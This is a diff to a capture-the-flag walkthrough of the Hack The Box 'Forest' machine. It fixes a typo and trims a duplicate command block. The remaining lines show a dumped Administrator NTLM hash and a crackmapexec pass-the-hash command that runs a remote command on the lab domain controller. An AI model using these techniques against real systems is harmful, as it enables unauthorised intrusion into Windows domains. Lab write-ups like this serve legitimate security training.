@@ -187,7 +187,7 @@ INFO: Done in 00M 09S
 INFO: Compressing output into 20220204141002_bloodhound.zip
 ```
 
-Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then run execute BloodHound in another terminal with `bloodhound`.
+Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with `bloodhound`.
 
 # Gaining Access
 
@@ -290,11 +290,7 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 
 Then, we can use this NTLM hash to read the **second flag** from the Domain Controller.
 
-```bash
-$ crackmapexec smb 10.129.158.159 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local
-SMB         10.129.158.159   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
-SMB         10.129.158.159   445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
-                                                                                                                                                                                
+```bash                        
 $ crackmapexec smb 10.129.158.159 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local -x "dir C:\Users\Administrator\Desktop" 
 SMB         10.129.158.159   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.129.158.159   445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
